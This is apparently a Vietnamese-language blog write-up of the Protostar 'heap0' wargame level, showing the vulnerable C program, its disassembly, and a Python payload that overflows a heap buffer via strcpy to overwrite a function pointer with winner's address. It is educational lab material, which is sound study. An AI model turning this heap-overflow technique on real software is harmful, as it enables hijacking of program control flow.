---
layout: post
title: heap0
---

Trong bài này, chúng ta sẽ bắt đầu nghiên cứu cách exploit bộ nhớ heap.
Heap là loại bộ nhớ được cấp phát động qua `malloc`, `calloc`, hay `new` trong C/C++.
Về cơ bản, exploit heap cũng tương tự như exploit stack.
Hai kỹ thuật này đều tập trung vào việc tìm địa chỉ của biến trên bộ nhớ để truy xuất và ghi đè.
Sau đây là source code và asm code của chương trình heap0.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```
```asm
0x08048464 <winner+0>:  push   ebp
0x08048465 <winner+1>:  mov    ebp,esp
0x08048467 <winner+3>:  sub    esp,0x18
0x0804846a <winner+6>:  mov    DWORD PTR [esp],0x80485d0
0x08048471 <winner+13>: call   0x8048398 <puts@plt>
0x08048476 <winner+18>: leave
0x08048477 <winner+19>: ret
0x08048478 <nowinner+0>:        push   ebp
0x08048479 <nowinner+1>:        mov    ebp,esp
0x0804847b <nowinner+3>:        sub    esp,0x18
0x0804847e <nowinner+6>:        mov    DWORD PTR [esp],0x80485dd
0x08048485 <nowinner+13>:       call   0x8048398 <puts@plt>
0x0804848a <nowinner+18>:       leave
0x0804848b <nowinner+19>:       ret
0x0804848c <main+0>:    push   ebp
0x0804848d <main+1>:    mov    ebp,esp
0x0804848f <main+3>:    and    esp,0xfffffff0
0x08048492 <main+6>:    sub    esp,0x20
0x08048495 <main+9>:    mov    DWORD PTR [esp],0x40
0x0804849c <main+16>:   call   0x8048388 <malloc@plt>
0x080484a1 <main+21>:   mov    DWORD PTR [esp+0x18],eax
0x080484a5 <main+25>:   mov    DWORD PTR [esp],0x4
0x080484ac <main+32>:   call   0x8048388 <malloc@plt>
0x080484b1 <main+37>:   mov    DWORD PTR [esp+0x1c],eax
0x080484b5 <main+41>:   mov    edx,0x8048478
0x080484ba <main+46>:   mov    eax,DWORD PTR [esp+0x1c]
0x080484be <main+50>:   mov    DWORD PTR [eax],edx
0x080484c0 <main+52>:   mov    eax,0x80485f7
0x080484c5 <main+57>:   mov    edx,DWORD PTR [esp+0x1c]
0x080484c9 <main+61>:   mov    DWORD PTR [esp+0x8],edx
0x080484cd <main+65>:   mov    edx,DWORD PTR [esp+0x18]
0x080484d1 <main+69>:   mov    DWORD PTR [esp+0x4],edx
0x080484d5 <main+73>:   mov    DWORD PTR [esp],eax
0x080484d8 <main+76>:   call   0x8048378 <printf@plt>
0x080484dd <main+81>:   mov    eax,DWORD PTR [ebp+0xc]
0x080484e0 <main+84>:   add    eax,0x4
0x080484e3 <main+87>:   mov    eax,DWORD PTR [eax]
0x080484e5 <main+89>:   mov    edx,eax
0x080484e7 <main+91>:   mov    eax,DWORD PTR [esp+0x18]
0x080484eb <main+95>:   mov    DWORD PTR [esp+0x4],edx
0x080484ef <main+99>:   mov    DWORD PTR [esp],eax
0x080484f2 <main+102>:  call   0x8048368 <strcpy@plt>
0x080484f7 <main+107>:  mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:  mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:  call   eax
0x080484ff <main+115>:  leave
0x08048500 <main+116>:  ret
```

Mục tiêu là gọi được hàm `winner`.
Mặc định, hàm này không hề có trong flow của chương trình.
Phiên bản được gọi là hàm `nowinner`.
Dựa trên kinh nghiệm những bài trước, hàm có thể lợi dụng được để exploit chương trình là `strcpy`.

Việc đầu tiên, chúng ta sẽ xác định địa chỉ của hàm `winner`.
Địa chỉ này sẽ được dùng để gọi hàm.
Sử dụng objdump hoặc gdb, ta tìm được địa chỉ của `winner` là `0x08048464`.

Nếu chạy thử chương trình với tham số bất kỳ, chương trình sẽ in ra địa chỉ của 2 biến kiểu struct tại 2 địa chỉ như sau.

```bash
heap0 a
```

<pre class="memory">
<span style="color:aqua">data is at 0x804a008</span>, <span style="color:springgreen">fp is at 0x804a050</span>
level has not been passed
</pre>

Với 2 địa chỉ này, kèm theo thông tin về 2 struct, ta biết `name` trong struct data nằm ở địa chỉ với offset 0x0 và `fp` nằm trong struct `fp` ở địa chỉ offset 0x0.
Khoảng cách giữa 2 biến là `0x0804a050 - 0x0804a008 = 0x48`, tương đương 72 byte.
Để gán địa chỉ của `winner` cho `fp` trong struct `fp`, ta sẽ tạo một buffer có 72 byte cùng với 4 byte địa chỉ của `winner`.
Khi `strcpy` được gọi, buffer này sẽ ghi bắt đầu từ `0x0804a008` đến hết `0x0804a053`.
Buffer như sau.

```bash
python -c 'print "A" * 72 + "\x64\x84\x04\x08"'
```
<pre class="memory">
data is at 0x804a008, fp is at 0x804a050
<span style="color:aqua">level passed</span>
</pre>

Mục tiêu đã hoàn thành!
## Ref
```bash
user@protostar:~$ heap0 $(python -c 'print "A" * 72 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
```
